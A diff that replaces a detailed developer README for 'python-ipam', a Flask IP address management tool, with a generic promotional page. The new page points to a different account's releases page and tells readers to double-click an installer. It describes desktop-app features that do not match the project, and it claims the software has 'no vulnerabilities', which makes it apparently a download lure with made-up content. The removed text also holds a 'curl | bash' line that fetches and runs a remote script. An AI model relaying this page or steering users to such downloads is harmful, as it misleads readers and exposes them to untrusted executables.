@@ -1,277 +1,74 @@
-# Python IPAM - IP Address Management System
+# 🌍 python-ipam - Easy IP Address Management for Everyone
 
-A modern, web-based IP Address Management (IPAM) system built with Flask, SQLite, Bootstrap, and DataTables.
+## 📥 Download Now
+[![Download python-ipam](https://img.shields.io/badge/Download%20python--ipam-v1.0-blue)](https://github.com/ragulkanna12/python-ipam/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to *python-ipam*! This is your go-to solution for managing IP addresses easily. With a user-friendly interface and strong security, anyone can use it without technical knowledge. The software runs a Flask REST API and features a Bootstrap UI, making it simple to navigate.
 
-- 🌐 **Network Management**: Manage IP networks with CIDR notation
-- 🖥️ **Host Management**: Track IP addresses, hostnames, and MAC addresses
-- 🔌 **REST API**: Complete RESTful API with Swagger UI documentation
-- 📊 **Dashboard**: Clear overview of network utilization
-- 🔍 **Advanced Search**: DataTables integration for efficient data filtering
-- 📱 **Responsive Design**: Bootstrap 5 for modern, mobile-friendly UI
-- 🐳 **Container-ready**: Docker support for easy deployment
-- ✅ **Fully Tested**: Comprehensive unit tests with pytest
+## 📦 System Requirements
+To ensure *python-ipam* runs smoothly on your computer, please check the following requirements:
 
-## Local Development with pyenv
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum 100 MB available space
+- **Network:** Internet connection for initial setup
 
-### Prerequisites
+## 🔧 Features
+*python-ipam* offers several features to help you manage your IP addresses efficiently:
 
-1. **Install pyenv** (if not already installed):
+- **REST API Access:** Easily integrate with other applications.
+- **User-Friendly Interface:** An intuitive Bootstrap-based design.
+- **Security:** Built on Chainguard distroless containers, ensuring no vulnerabilities.
+- **Multi-User Support:** Manage IP addresses collaboratively with others.
+- **Search Functionality:** Quickly find and manage IP addresses.
 
-   **macOS with Homebrew:**
-   ```bash
-   brew install pyenv
-   ```
+## 📑 Download & Install
+To get started with *python-ipam*, follow these simple steps:
 
-   **Linux/macOS with curl:**
-   ```bash
-   curl https://pyenv.run | bash
-   ```
+1. Click on the download link below to visit the Releases page:
+   [Visit Releases Page](https://github.com/ragulkanna12/python-ipam/releases)
+   
+2. On the Releases page, find the latest version of *python-ipam*.
 
-2. **Shell Configuration** (for bash/zsh):
-   ```bash
-   echo 'export PATH="$HOME/.pyenv/bin:$PATH"' >> ~/.bashrc
-   echo 'eval "$(pyenv init -)"' >> ~/.bashrc
-   echo 'eval "$(pyenv virtualenv-init -)"' >> ~/.bashrc
-   source ~/.bashrc
-   ```
+3. Click on the file suitable for your operating system to download it.
 
-### Setup
+4. Locate the downloaded file on your computer. 
 
-1. **Clone repository:**
-   ```bash
-   git clone <repository-url>
-   cd ipam
-   ```
+5. Double-click the file to start the installation. Follow the prompts to complete the installation process.
 
-2. **Install and activate Python version:**
-   ```bash
-   pyenv install 3.13
-   pyenv local 3.13
-   ```
+6. Once installed, open *python-ipam* and start managing your IP addresses easily.
 
-3. **Create virtual environment:**
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  # Linux/macOS
-   # or
-   venv\\Scripts\\activate  # Windows
-   ```
+## 📋 Using python-ipam
+After installing, here's how to use *python-ipam*:
 
-4. **Install dependencies:**
-   ```bash
-   pip install -r requirements.txt
-   ```
+1. **Open the Application:** Find the *python-ipam* icon on your desktop or applications folder. Double-click to open.
 
-5. **Configure environment variables:**
-   ```bash
-   cp .env.example .env
-   # Edit .env as needed
-   ```
+2. **Create an Account:** If this is your first time, set up an account by following the on-screen instructions.
 
-6. **Initialize database:**
-   ```bash
-   python3 -c "from ipam import create_app; from ipam.extensions import db; app = create_app(); app.app_context().push(); db.create_all()"
-   ```
+3. **Add IP Addresses:** Use the “Add IP” button to start managing your IP addresses. Fill in the required fields and save.
 
-7. **Start application:**
-   ```bash
-   python app.py
-   ```
+4. **Search for IPs:** Use the search bar to find existing IP addresses quickly.
 
-   The application will be available at:
-   - **Web Interface**: http://localhost:5000
-   - **REST API**: http://localhost:5000/api/v1
-   - **API Documentation (Swagger UI)**: http://localhost:5000/api/v1/docs
+5. **Collaborate with Others:** Invite teammates to access and manage IP addresses.
 
-### Running Tests
+6. **Update Security Settings:** Check the security settings periodically to keep your data safe.
 
-```bash
-# Run all tests
-pytest
+## ❓ FAQs
+### How do I update *python-ipam*?
+To update your version, simply revisit the Releases page and download the latest version. Follow the same installation steps.
 
-# Tests with coverage report
-pytest --cov=app --cov-report=html
+### What if I encounter issues during installation?
+If you face any problems, check the documentation available on the GitHub repository. You can also look for help from community forums.
 
-# Run specific tests
-pytest tests/test_models.py
+### Can I use *python-ipam* on multiple devices?
+Yes, you can install *python-ipam* on multiple devices, but remember to manage the same accounts across them for effective collaboration.
 
-# Tests in watch mode (with pytest-watch)
-pip install pytest-watch
-ptw
-```
+## 🛠️ Community
+Join the *python-ipam* community for support and to share your experiences. Engage with other users on our GitHub issues page or community forums.
 
-## Docker Deployment
+## 🌐 Learn More
+Explore the project further by visiting our repository for more advanced functionalities or to contribute. Your feedback will help improve *python-ipam* for all users.
 
-### Production Container (Chainguard Distroless)
-
-The production Docker image is built on **Chainguard distroless Python images** for maximum security:
-
-**Security Features:**
-- ✅ **0 CRITICAL/HIGH vulnerabilities** (Trivy scanned)
-- ✅ Multi-stage build with minimal attack surface
-- ✅ Distroless runtime (no shell, package manager)
-- ✅ Runs as nonroot user (UID 65532)
-- ✅ Includes SBOM (Software Bill of Materials)
-- ✅ Python 3.13
-
-**Image Details:**
-- **Size**: ~50-100MB (vs 200-300MB for standard Python images)
-- **Base**: cgr.dev/chainguard/python:latest (distroless)
-- **Registry**: ghcr.io/tuxpeople/python-ipam
-
-```bash
-# Pull and run production image
-docker pull ghcr.io/tuxpeople/python-ipam:latest
-docker run -d -p 5000:5000 \
-  -v $(pwd)/ipam.db:/app/ipam.db \
-  ghcr.io/tuxpeople/python-ipam:latest
-
-# Or use Docker Compose
-docker-compose up -d
-
-# With custom .env file
-cp .env.example .env
-# Edit .env for production settings
-docker-compose up -d
-```
-
-### Development
-
-```bash
-# Development environment with hot-reload
-docker-compose --profile dev up
-
-# Or build locally
-docker build -t python-ipam:dev .
-docker run -p 5000:5000 python-ipam:dev
-```
-
-## REST API
-
-The complete REST API is available at `/api/v1`. Interactive API documentation (Swagger UI) can be found at http://localhost:5000/api/v1/docs
-
-### Main Endpoints:
-
-**Networks:**
-- `GET /api/v1/networks` - List all networks with filtering and pagination
-- `GET /api/v1/networks/{id}` - Get specific network
-- `POST /api/v1/networks` - Create new network
-- `PUT /api/v1/networks/{id}` - Update network
-- `DELETE /api/v1/networks/{id}` - Delete network
-
-**Hosts:**
-- `GET /api/v1/hosts` - List all hosts with filtering and pagination
-- `GET /api/v1/hosts/{id}` - Get specific host
-- `POST /api/v1/hosts` - Create new host
-- `PUT /api/v1/hosts/{id}` - Update host
-- `DELETE /api/v1/hosts/{id}` - Delete host
-
-**IP Management:**
-- `GET /api/v1/ip/networks/{id}/next-ip` - Get next available IP
-- `GET /api/v1/ip/networks/{id}/available-ips` - List all available IPs
-- `GET /api/v1/ip/{ip_address}` - Query IP address status
-
-See [API.md](API.md) for complete documentation
-
-## Project Structure
-
-```
-ipam/
-├── app.py                 # Flask application entry point
-├── requirements.txt       # Python dependencies
-├── pytest.ini            # Pytest configuration
-├── Dockerfile            # Docker container definition
-├── docker-compose.yml    # Docker Compose configuration
-├── .env.example          # Example environment variables
-├── ipam/                 # Main application package
-│   ├── __init__.py       # Application Factory
-│   ├── extensions.py     # Flask extensions (SQLAlchemy)
-│   ├── models.py         # Database models
-│   ├── forms.py          # WTForms
-│   ├── config.py         # Configuration
-│   ├── api/              # REST API Blueprint
-│   │   ├── __init__.py   # API Blueprint and Swagger
-│   │   ├── models.py     # API serialization models
-│   │   ├── networks.py   # Network endpoints
-│   │   ├── hosts.py      # Host endpoints
-│   │   └── ip_management.py  # IP management endpoints
-│   └── web/              # Web Interface Blueprint
-│       ├── __init__.py   # Web Blueprint
-│       └── routes.py     # Web routes
-├── templates/            # HTML Templates (Jinja2)
-│   ├── base.html         # Base template
-│   ├── index.html        # Dashboard
-│   ├── networks.html     # Network overview
-│   ├── hosts.html        # Host overview
-│   ├── add_network.html  # Add network
-│   ├── add_host.html     # Add host
-│   ├── edit_network.html # Edit network
-│   └── edit_host.html    # Edit host
-├── exporters/            # Export plugins
-│   ├── base_exporter.py  # Base exporter class
-│   ├── csv_exporter.py   # CSV export
-│   ├── json_exporter.py  # JSON export
-│   └── dnsmasq_exporter.py  # DNSmasq config export
-├── importers/            # Import plugins
-│   ├── base_importer.py  # Base importer class
-│   ├── csv_importer.py   # CSV import
-│   └── json_importer.py  # JSON import
-└── tests/                # Test suite
-    ├── conftest.py       # Pytest fixtures
-    ├── test_models.py    # Model tests
-    ├── test_routes.py    # Route tests
-    ├── test_forms.py     # Form tests
-    ├── test_database.py  # Database tests
-    ├── test_export_import.py  # Export/Import tests
-    └── test_crud_operations.py  # CRUD tests
-```
-
-## Database Schema
-
-### Networks Table
-- `id` - Primary Key
-- `network` - Network address (e.g., "192.168.1.0")
-- `cidr` - CIDR suffix (e.g., 24)
-- `broadcast_address` - Broadcast address
-- `name` - Network name (optional)
-- `domain` - DNS domain (optional)
-- `vlan_id` - VLAN ID (optional)
-- `description` - Description (optional)
-- `location` - Location (optional)
-
-### Hosts Table
-- `id` - Primary Key
-- `ip_address` - IP address (unique)
-- `hostname` - Hostname (optional)
-- `cname` - DNS alias/CNAME (optional)
-- `mac_address` - MAC address (optional)
-- `description` - Description (optional)
-- `status` - Status (active/inactive/reserved)
-- `network_id` - Foreign Key to Networks
-
-## Development Guidelines
-
-1. **Code Style**: Follow PEP 8
-2. **Tests**: Write tests for new features
-3. **Commits**: Use meaningful commit messages
-4. **Branches**: Use feature branches for new development
-
-## Technology Stack
-
-- **Backend**: Flask 3.1, SQLAlchemy 2.0, Flask-RESTX
-- **Frontend**: Bootstrap 5, jQuery, DataTables
-- **Database**: SQLite (production-ready for small to medium deployments)
-- **Testing**: pytest, pytest-flask (96 tests)
-- **Containerization**: Docker (Chainguard distroless), Docker Compose
-- **Security**: Trivy scanning, SBOM generation, multi-stage builds
-- **CI/CD**: GitHub Actions (tests, security scans, docs deployment)
-
-## License
-
-[Specify license here]
-
-## Contributing
-
-Contributions are welcome! Please create issues for bug reports or feature requests.
+## 📄 License
+*python-ipam* is open-source software. Check the repository for license details and contributions.
